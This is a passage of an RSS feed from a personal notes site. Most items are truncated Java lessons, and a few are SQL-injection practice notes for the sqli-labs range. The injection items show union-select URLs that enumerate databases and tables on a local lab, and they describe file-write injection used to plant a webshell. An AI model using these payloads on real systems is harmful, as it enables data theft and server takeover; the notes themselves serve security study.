+0000</pubDate><guid>https://ob.tianzhongs.ml/182_%E5%8C%BF%E5%90%8D%E5%86%85%E9%83%A8%E7%B1%BBeg/</guid><description>182_匿名内部类eg 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 /* 匿名内部类： 1、什么是内部类？ 内部类：在类的内部又定义了一个新的类。被称为内部类。 2、内部类的分类： 静态内部类：类似于静态变量 实例内部类：类似于实例变量 局部内部类：类似于局部变量 3、使用内部类编写的代码，可读性很差。能不用尽量不用。 4、匿名内部类是局部内部类的一种。 因为这个类没有名字而得名，叫做匿名内部类。 5、学习匿名内部类主要是让大家以后在阅读别人代码的时候，能够理解。 并不代表以后都要这样写。因为匿名内部类有两个缺点： 缺点1：太复杂，太乱，可读性差。 缺点2：类没有名字，以后想重复使用，不能用。 6、不理解算了，你只要记住这种写法就行。 */ class Test01{ // 静态变量 static String country; // 该类在类的内部，所以称为内部类 // 由于前面有static，所以称为“静态内部类” static class Inner1{ } // 实例变量 int age; // 该类在类的内部，所以称为内部类 // 没有static叫做实例内部类。 class Inner2{ } // 方法 public void doSome(){ // 局部变量 int i = 100; // 该类在类的内部，所以称为内部类 // 局部内部类。 class Inner3{ } public void doOther(){ // doSome()方法中的局部内部类Inner3，在doOther()中不能用。 } // main方法，入口 public static void main(String[] args){ // 调用MyMath中的mySum方法。 MyMath mm = new MyMath(); /* Compute c = new ComputeImpl(); mm.</description></item><item><title>191_数组</title><link>https://ob.tianzhongs.ml/191_%E6%95%B0%E7%BB%84/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/191_%E6%95%B0%E7%BB%84/</guid><description>191_数组 概述 Java语言中的数组是一种引用数据类型。不属于基本数据类型。数组的父类是Object。 数组可以同时容纳多个元素。（数组是一个数据的集合。） 数组当中可以存储“基本数据类型”的数据，也可以存储“引用数据类型”的数据。 数组因为是引用类型，数组是存储在堆中的 数组当中如果存储的是“java对象”的话，实际上存储的是对象的引用（内存地址），数组中不能直接存储java对象。 数组一旦创建，数组长度不可变 数组的分类：一维数组. 二维数组. 三维数组. 多维数组&amp;hellip;（一维数组较多，二维数组偶尔使用！） 采用length用来获取数组中元素的个数。 java中的数组要求数组中元素的类型统一。比如int类型数组只能存储int类型，Person类型数组只能存储Person类型。 例如：超市购物，购物袋中只能装苹果，不能同时装苹果和橘子。（数组中存储的元素类型统一） 数组在内存方面存储的时候，存储的每一个元素都是连续的，内存地址连续。数组实际上是一种简单的数据结构。 11.数组中首元素的内存地址作为整个数组对象的内存地址。 数组中每一个元素都是有下标的，下标从0开始，以1递增。最后一个元素的下标是length - 1 存取元素都是通过下标来进行的。 [!</description></item><item><title>192_main方法上面的String_args</title><link>https://ob.tianzhongs.ml/192_main%E6%96%B9%E6%B3%95%E4%B8%8A%E9%9D%A2%E7%9A%84String_args/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/192_main%E6%96%B9%E6%B3%95%E4%B8%8A%E9%9D%A2%E7%9A%84String_args/</guid><description>192_main方法上面的String_args [!tip]+ 作用 这个数组是留给用户的，用户可以在控制台上输入参数，这个参数自动会被转换为“String[] args”
解释 JVM调用main方法的时候，会自动传一个String数组过来。 这个方法程序员负责写出来，JVM负责调用。JVM调用的时候一定会传一个String数组过来。 默认长度：0 ! [[../../../../assets/Pasted image 20220715192618.png|400]]
输入参数 输入会变成一个数组，空格分开各个参数，不是逗号 第一种： 1. 打开run的这个 !</description></item><item><title>193_引用数据类型数组</title><link>https://ob.tianzhongs.ml/193_%E5%BC%95%E7%94%A8%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E6%95%B0%E7%BB%84/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/193_%E5%BC%95%E7%94%A8%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E6%95%B0%E7%BB%84/</guid><description>193_引用数据类型数组 [!info]+ 总结 数组中可以将引用类型的类型实例作为元素 元素可以是这个元素的类本身的对象，也可以是他的继承对象，即子类型的对象 还可以通过遍历的方式去使用其中的方法
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 public class Test03 { public static void main(String[] args) { // 创建一个Animal类型的数组 Animal[] an={new Animal(),new Cat(),new Dog(),new DogSon()}; for (int i=0;i&amp;lt;an.</description></item><item><title>194_数组扩容</title><link>https://ob.tianzhongs.ml/194_%E6%95%B0%E7%BB%84%E6%89%A9%E5%AE%B9/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/194_%E6%95%B0%E7%BB%84%E6%89%A9%E5%AE%B9/</guid><description>194_数组扩容 先新建一个大容量的数组，然后将小容量数组中的数据一个一个拷贝到大数组当中。
[!tip]+ 注意 如果数组的元素是引用，那么数组中存储的其对象的内存地址 所以，拷贝的时候实际是拷贝的内存地址
结论：数组扩容效率较低。因为涉及到拷贝的问题。所以在以后的开发中请注意：尽可能少的进行数组的拷贝。 可以在创建数组对象的时候预估计以下多长合适，最好预估准确，这样可以减少数组的扩容次数。提高效率。
[!bug]+ 数组拷贝方法：arrarycopy() arraycopy() 方法位于 java.lang.System 类中
语法格式
1 System.</description></item><item><title>195_二维数组</title><link>https://ob.tianzhongs.ml/195_%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/195_%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/</guid><description>195_二维数组 概述 二维数组其实是一个特殊的一维数组，特殊在这个数组当中的每一个元素是一个一维数组。 三维数组同理，每一个元素都是一个二维数组 初始化 静态初始化 1 int[][] array = {{1,1,1},{2,3,4,5},{0,0,0,0},{2,3,4,5},{2,3,4,5},{2,3,4,5},{2,3,4,5}}; 动态初始化 1 nt[][] array = new int[3][4]; [!</description></item><item><title>196_eg1_模拟压栈</title><link>https://ob.tianzhongs.ml/196_eg1_%E6%A8%A1%E6%8B%9F%E5%8E%8B%E6%A0%88/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/196_eg1_%E6%A8%A1%E6%8B%9F%E5%8E%8B%E6%A0%88/</guid><description>196_eg1_模拟压栈 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 /* 编写程序，使用一维数组，模拟栈数据结构。 要求： 1、这个栈可以存储java中的任何引用类型的数据。 2、在栈中提供push方法模拟压栈。（栈满了，要有提示信息。） 3、在栈中提供pop方法模拟弹栈。（栈空了，也有有提示信息。） 4、编写测试程序，new栈对象，调用push pop方法来模拟压栈弹栈的动作。 5、假设栈的默认初始化容量是10.</description></item><item><title>197_eg2_酒店</title><link>https://ob.tianzhongs.ml/197_eg2_%E9%85%92%E5%BA%97/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/197_eg2_%E9%85%92%E5%BA%97/</guid><description>197_eg2_酒店 思路 [!tip]+ 怎么个思路
搭建一个酒店，需要考虑其基本的组成 一个酒店的基本单位是房间，所以需要一个room类，房间有三个状态。 房间号，由层数和房间号组成 空闲与否，boolean 房间类型：单人间、标准间、豪华间 房间需要考虑是否是一个房间，以及如何进行输出。所以需要考虑重写equals和toString方法 hotel类由许多的房间组成，所以hotel的属性就是room类型的二维数组 需要的方法 打印房间情况的方法 订房的方法 退房的方法 一个主类对方法进行测试 建酒店，new 一个hotel if判断用户需求 代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 public class Room { //test /* public static void main(String[] args) { Room r=new Room(12,&amp;#34;单人间&amp;#34;,true); System.</description></item><item><title>2.1.SQL注入之sqli-labs环境搭建</title><link>https://ob.tianzhongs.ml/2.1.SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqli-labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2.1.SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqli-labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</guid><description>SQL注入之sqli-labs环境搭建 往往很多新手在刚学习SQL注入的时候，都需要拥有一个能SQL注入的网站，需要有SQL注入点 的。直接去互联网上找的话对新手未免有点太难了，因此：我们一般都是在本地搭建一个能SQL注入测试的网站，那样我们学习SQL注入就容易多了。
Sqli-labs是一个印度程序员写的，用来学习 sql注入的一个游戏教程。
Sqli-labs项目地址—Github获取： https://github.com/Audi-1/sqli-labs（在预习资料中有下载好的）
{:height 336, :width 734}
Sqli-labs环境安装 需要安装以下环境 apache+mysql+php 如果可以的话，推荐在windows和linux下分别安装</description></item><item><title>2.2 SQL注入之MYSQL手工注入</title><link>https://ob.tianzhongs.ml/2.2-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2.2-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/</guid><description>public:: true
SQL注入之MYSQL手工注入 本章节重点在于熟悉注入流程，以及注入原理。练习靶场为sqli-labs第二关数字型注入。
sqli-labs数字型注入 {:height 247, :width 734}
在url中输入id值，执行查询sql语句。即可得到对应数据
less-2源码分析：
浏览器 进行数据提交 服务器 ：
1 2 3 4 5 get 提交 ： url 数据长度 速度快 用于： post 提交 ： 服务器 安全性 数据量 注入流程 注入语句 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 尝试手工注入：SQL注入：1.</description></item><item><title>2.3 SQL注入之高权限注入上</title><link>https://ob.tianzhongs.ml/2.3-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E9%AB%98%E6%9D%83%E9%99%90%E6%B3%A8%E5%85%A5%E4%B8%8A/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2.3-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E9%AB%98%E6%9D%83%E9%99%90%E6%B3%A8%E5%85%A5%E4%B8%8A/</guid><description>SQL注入之高权限注入 在数据库中区分有数据库系统用户与数据库普通用户,二者的划分主要体现在对一些高级函数与资源表的访问权限上。直白一些就是高权限系统用户拥有整个数据库的操作权限,而普通用户只拥有部分已配置的权限。
网站在创建的时候会调用数据库链接,会区分系统用户链接与普通用户链接;当多个网站存在一个数据库的时候,root就拥有最高权限可以对多个网站进行管辖,普通用户仅拥有当前网站和配置的部分权限。所以当我们获取到普通用户权限时,我们只拥有单个数据库权限,甚至文件读写失败;取得高权限用户权限，不仅可以查看所有数据库,还可以对服务器文件进行读写操作。
多个网站共享mysql服务器 MySQL 权限介绍 mysql中存在4个控制权限的表，分别为user表，db表，tables_priv表，columns_priv表， 我当前的版本mysql 5.7.22 。
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 select * from user where user=&amp;#39;root&amp;#39; and host=&amp;#39;localhost&amp;#39;\G; mysql权限表的验证过程为： 先从user表中的Host,User,Password这3个字段中判断连接的ip、用户名、密码是否存在，存在则通过验证。 通过身份认证后，进行权限分配， 按照user，db，tables_priv，columns_priv的顺序进行验证。 即先检查全局权限表user，如果user中对应的权限为Y，则此用户对所有数据库的权限都为Y， 将不再检查db, tables_priv,columns_priv；如果为N，则到db表中检查此用户对应的具体数据库， 并得到db中为Y的权限；如果db中为N，则检查tables_priv中此数据库对应的具体表，取得表中的权限Y，以此类推。 2.</description></item><item><title>2.4 SQL注入之高权限注入下</title><link>https://ob.tianzhongs.ml/2.4-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E9%AB%98%E6%9D%83%E9%99%90%E6%B3%A8%E5%85%A5%E4%B8%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2.4-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E9%AB%98%E6%9D%83%E9%99%90%E6%B3%A8%E5%85%A5%E4%B8%8B/</guid><description>SQL注入之高权限注入 1.注入流程与上节实例相同
查询所有数据库名称 1 http://localhost/sqli-labs-master/Less-2/?id=-2%20union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata 查询数据库对应的表名 1 http://localhost/sqli-labs-master/Less-2/?id=-2%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=0x74657374 查询表名对应的字段名 1 http://localhost/sqli-labs-master/Less-2/?</description></item><item><title>2.5 SQL注入之文件读写</title><link>https://ob.tianzhongs.ml/2.5-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2.5-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/</guid><description>SQL注入之文件读写 文件读写注入的原理 就是利用文件的读写权限进行注入，它可以写入一句话木马，也可以读取系统文件的敏感信息。
文件读写注入的条件 高版本的MYSQL添加了一个新的特性secure_file_priv，该选项限制了mysql导出文件的权限
secure_file_priv选项
1 2 3 4 5 linux cat etc/conf win www/mysql / my.ini show global variables like &amp;lsquo;%secure%&amp;rsquo; 查看mysql全局变量的配置</description></item><item><title>201_排序与查找</title><link>https://ob.tianzhongs.ml/201_%E6%8E%92%E5%BA%8F%E4%B8%8E%E6%9F%A5%E6%89%BE/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/201_%E6%8E%92%E5%BA%8F%E4%B8%8E%E6%9F%A5%E6%89%BE/</guid><description>201_排序与查找 排序的内置方法java.util.Arrays eg
1 java.util.Arrays(数组名); output ![[../../../../assets/Pasted image 20220720101424.png]]
[[202.冒泡排序方法]] [[203.选择排序]] [[204.顺序查找]] [[205.二分查找]] [[207.数组工具类java.util.Arrays]]</description></item><item><title>202_冒泡排序方法</title><link>https://ob.tianzhongs.ml/202_%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E6%96%B9%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/202_%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E6%96%B9%E6%B3%95/</guid><description>202_冒泡排序方法 [!tip]+ 讲解
从第一个开始，依次向右比较，左边比右边的数大，就交换两个数字 第一轮可以把最大的数字放到最左边，第二轮依次 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 public class Test02 { public static void main(String[] args) { int[] b={1,54,6,7,6,464,78,12,46}; int[] c=sorta(b); for (int i = 0; i &amp;lt; c.</description></item><item><title>203_选择排序</title><link>https://ob.tianzhongs.ml/203_%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/203_%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/</guid><description>203_选择排序 [!tip]+ 讲解 假设第一个数字为最小的数min，然后依次在这个数字后面找更小的数 如果找到了就记录最小数的下标，然后再把这个数与参与排序的第一个数相互交换 再假设第二个数为最小的数，在其后找最小的数交换 注意：与冒泡排序循环次数一样，都是(n-1)? 阶加次 时间复杂度： O(n²) 演示 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 public class Test03 { public static void main(String[] args) { int[] c=sorta(new int[]{2,3,38,5,47,15,36,26,27,44,46,38,47,50,48}); for (int i = 0; i &amp;lt; c.</description></item><item><title>204_顺序查找</title><link>https://ob.tianzhongs.ml/204_%E9%A1%BA%E5%BA%8F%E6%9F%A5%E6%89%BE/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/204_%E9%A1%BA%E5%BA%8F%E6%9F%A5%E6%89%BE/</guid><description>204_顺序查找 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 public class SearchTest01 { public static void main(String[] args) { int[] arr={1,5,45,5,64,8}; /* for (int i = 0; i &amp;lt;arr.</description></item><item><title>205_二分查找</title><link>https://ob.tianzhongs.ml/205_%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/205_%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/</guid><description>205_二分查找 必要条件:**必须要在排序的基础上 ** 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public class ArraySearch02 { public static void main(String[] args) { int[] arr={1,45,56,78,89,455,1254,4546}; int index=arrBinSearch(arr,78); System.</description></item><item><title>207_数组工具类java_util_Arrays</title><link>https://ob.tianzhongs.ml/207_%E6%95%B0%E7%BB%84%E5%B7%A5%E5%85%B7%E7%B1%BBjava_util_Arrays/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/207_%E6%95%B0%E7%BB%84%E5%B7%A5%E5%85%B7%E7%B1%BBjava_util_Arrays/</guid><description>207_数组工具类java_util_Arrays eg
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import java.</description></item><item><title>2111_String类</title><link>https://ob.tianzhongs.ml/2111_String%E7%B1%BB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2111_String%E7%B1%BB/</guid><description>2111_String类 String基本 [!tip]+ 关于Java JDK中内置的一个类：java.lang.String
String表示字符串，属于引用数据类型，不属于基本数据类型。 在java中随便使用双引号括起来的都是String对象。例如：&amp;ldquo;abc&amp;rdquo;，&amp;ldquo;def&amp;rdquo;，&amp;ldquo;hello world!&amp;quot;，这是3个String对象。 java中规定，双引号括起来的字符串，是不可变的，也就是说&amp;quot;abc&amp;quot;自出生到最终死亡，不可变，不能变成&amp;quot;abcd&amp;rdquo;，也不能变成&amp;quot;ab&amp;quot; 在JDK当中双引号括起来的字符串，例如：&amp;ldquo;abc&amp;rdquo; &amp;ldquo;def&amp;quot;都是直接存储在“方法区”的“字符串常量池”当中的。因为这些字符串需要频繁的进行使用,垃圾回收器是不会回收常量的 不管是直接用双引号定义的字符串变量,还是new出来的字符串,双引号字符串都是存储在方法区中的常量池的,new出来的,会在堆中存放一个指向这个常量池的内存地址 eg1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public class StringTest01 { public static void main(String[] args) { // 这两行代码表示底层创建了3个字符串对象，都在字符串常量池当中。 String s1 = &amp;#34;abcdef&amp;#34;; String s2 = &amp;#34;abcdef&amp;#34; + &amp;#34;xy&amp;#34;; // 分析：这是使用new的方式创建的字符串对象。这个代码中的&amp;#34;xy&amp;#34;是从哪里来的？ // 凡是双引号括起来的都在字符串常量池中有一份。 // new对象的时候一定在堆内存当中开辟空间。 String s3 = new String(&amp;#34;xy&amp;#34;); // i变量中保存的是100这个值。 int i = 100; // s变量中保存的是字符串对象的内存地址。 // s引用中保存的不是&amp;#34;abc&amp;#34;，是0x1111 // 而0x1111是&amp;#34;abc&amp;#34;字符串对象在“字符串常量池”当中的内存地址。 String s = &amp;#34;abc&amp;#34;; } } !</description></item><item><title>2112_String常用方法</title><link>https://ob.tianzhongs.ml/2112_String%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2112_String%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/</guid><description>2112_String常用方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 public class Test03 { public static void main(String[] args) { //charAt 返回字符串指定下标的字符 String a=&amp;#34;我是一个中国人&amp;#34;; System.</description></item><item><title>2113_字符串拼接StringBuffer</title><link>https://ob.tianzhongs.ml/2113_%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5StringBuffer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2113_%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5StringBuffer/</guid><description>2113_字符串拼接StringBuffer 在java.lang中 帮助文档 : https://www.matools.com/file/manual/jdk_api_1.8_google/java/lang/StringBuffer.html
概述 [!tip]+ 使用原因
使用+号来对字符串拼接,会在方法区常量池中占用大量的内存,造成方法区的压力(每次拼接都会新建一个字符串在常量池中) 使用StringBuffer可以创建字符串缓冲区对象,缓解常量池压力 默认是创建16byte的数组作为字符串缓冲区对象![[../../../../assets/Pasted image 20220723102153.png]] ![[../../../../assets/Pasted image 20220723102210.png]] [!</description></item><item><title>2114_字符串拼接StringBuilder</title><link>https://ob.tianzhongs.ml/2114_%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5StringBuilder/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2114_%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5StringBuilder/</guid><description>2114_字符串拼接StringBuilder 帮助文档: StringBuilder
StringBuilder和[[214.字符串拼接StringBuffer|StringBuffer]]的区别 StringBuilder没有synchronized关键字修饰,所以在多线程环境下是不安全的,而**[[214.字符串拼接StringBuffer|StringBuffer]]在多线程下是安全的** (StringBuilder非线程安全,StringBuffer线程安全) 1 2 3 4 5 6 7 8 9 public class StringBuilderTest01 { public static void main(String[] args) { StringBuilder s1=new StringBuilder(100);//初始化容量 s1.</description></item><item><title>2115_八种包装类型Integer等等</title><link>https://ob.tianzhongs.ml/2115_%E5%85%AB%E7%A7%8D%E5%8C%85%E8%A3%85%E7%B1%BB%E5%9E%8BInteger%E7%AD%89%E7%AD%89/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2115_%E5%85%AB%E7%A7%8D%E5%8C%85%E8%A3%85%E7%B1%BB%E5%9E%8BInteger%E7%AD%89%E7%AD%89/</guid><description>包: java.long
[!tip]+ 八种包装类型存在的意义
因为8种基本数据类型不够用。所以SUN又提供对应的8种包装类型。 在调用方法等等时候,传入的参数如果是对象,那么基本数据类型不满足条件的时候,就可以传入包装类型就好了 基本数据类型向引用数据类型的转换 对照 基本数据类型 包装类型 父类 byte java.</description></item><item><title>2116_String_int_Integer之间的相互转换</title><link>https://ob.tianzhongs.ml/2116_String_int_Integer%E4%B9%8B%E9%97%B4%E7%9A%84%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2116_String_int_Integer%E4%B9%8B%E9%97%B4%E7%9A%84%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2/</guid><description>2116_String_int_Integer之间的相互转换 ![[../assets/7d832e5816d04e45b9b398ef72c9db4b.png]]
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 public class Test04 { public static void main(String[] args) { //String --&amp;gt; int String s1=&amp;#34;123&amp;#34;; int i1=Integer.</description></item><item><title>2121_java对日期的处理</title><link>https://ob.tianzhongs.ml/2121_java%E5%AF%B9%E6%97%A5%E6%9C%9F%E7%9A%84%E5%A4%84%E7%90%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2121_java%E5%AF%B9%E6%97%A5%E6%9C%9F%E7%9A%84%E5%A4%84%E7%90%86/</guid><description>2121_java对日期的处理 获取时间以及时间相互转换 包名:- java.util.Date 帮助文档:https://www.matools.com/file/manual/jdk_api_1.8_google/java/util/Date.html
日期格式化SimpleDateFormat帮助文档:https://www.matools.com/file/manual/jdk_api_1.8_google/java/text/SimpleDateFormat.html
获取当前时间 对时间进行格式化输出 文本转换成Date格式 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import java.</description></item><item><title>2131_关于数字的格式化</title><link>https://ob.tianzhongs.ml/2131_%E5%85%B3%E4%BA%8E%E6%95%B0%E5%AD%97%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2131_%E5%85%B3%E4%BA%8E%E6%95%B0%E5%AD%97%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96/</guid><description>2131_关于数字的格式化 java.text.DecimalFormat 作用 对数字进行格式化,添加千分位,补位等等 包:https://www.matools.com/file/manual/jdk_api_1.8_google/java/text/DecimalFormat.html eg:
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import java.</description></item><item><title>221_异常</title><link>https://ob.tianzhongs.ml/221_%E5%BC%82%E5%B8%B8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/221_%E5%BC%82%E5%B8%B8/</guid><description>221_异常 帮助文档:https://www.matools.com/file/manual/jdk_api_1.8_google/java/lang/Exception.html
概述 异常是一种类,[[#eg2 new异常对象|可以new对象]] 通过处理异常,增加程序的健壮性 eg1 1 2 3 4 5 6 7 8 public class Test01 { public static void main(String[] args) { int c=10/0; /* 代码执行到此处,会出现异常,然后 就会new一个异常对象:Exception in thread &amp;#34;main&amp;#34; java.</description></item><item><title>222_UML_统一建模语言</title><link>https://ob.tianzhongs.ml/222_UML_%E7%BB%9F%E4%B8%80%E5%BB%BA%E6%A8%A1%E8%AF%AD%E8%A8%80/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/222_UML_%E7%BB%9F%E4%B8%80%E5%BB%BA%E6%A8%A1%E8%AF%AD%E8%A8%80/</guid><description>222_UML_统一建模语言 语法来源 使用Mermaid创建类图 帮助文档:http://soft.xiaoshujiang.com/docs/grammar/feature/mermaid/#e7b1bbe59bbe_36 建议博客版本:https://www.cnblogs.com/mybdss/p/14958781.html
[[使用Mermaid语法画UML类图]]</description></item><item><title>223_异常的继承结构</title><link>https://ob.tianzhongs.ml/223_%E5%BC%82%E5%B8%B8%E7%9A%84%E7%BB%A7%E6%89%BF%E7%BB%93%E6%9E%84/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/223_%E5%BC%82%E5%B8%B8%E7%9A%84%E7%BB%A7%E6%89%BF%E7%BB%93%E6%9E%84/</guid><description>223_异常的继承结构 总结 编译阶段异常是不会出现的,编译时异常和运行时异常都是发生在运行阶段 因为异常需要new对象,只有程序运行才会new对象 编译时异常是因为必须在编写代码阶段预先处理,不然编译器就会报错而得名 Object下有Throwable(可抛出) Throwable下有两个分支: Error:错误,不可以处理,终止程序执行,直接退出JVM Exception:异常,可以处理 尽量避免Error,在Exception时就对其进行处理 编译时异常发生概率相对较高 继承结构图 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 classDiagram Object&amp;lt;|--Throwable Throwable:不管是错误还是异常,都是可以抛出的 Throwable&amp;lt;|--Error Error:所有的错误只要发生,java程序都会终止执行,退出JVM Error&amp;lt;|--IOError Error&amp;lt;|--VirtualMachineError Throwable&amp;lt;|--Exception Exception&amp;lt;|--ExceptionSubClass:编译时异常 ExceptionSubClass:不是编译时发生的 ExceptionSubClass:编写程序的时候事先对其进行异常处理 ExceptionSubClass:如果不处理,编译器就会报错 Exception&amp;lt;|--RuntimeException:运行时异常 RuntimeException:运行时异常, RuntimeException:你可以处理,也可以不处理 RuntimeException&amp;lt;|--NullPointerException RuntimeException&amp;lt;|--ClassCastException RuntimeException&amp;lt;|--IllegalArgumentException IllegalArgumentException&amp;lt;|--NumberFormatException %% 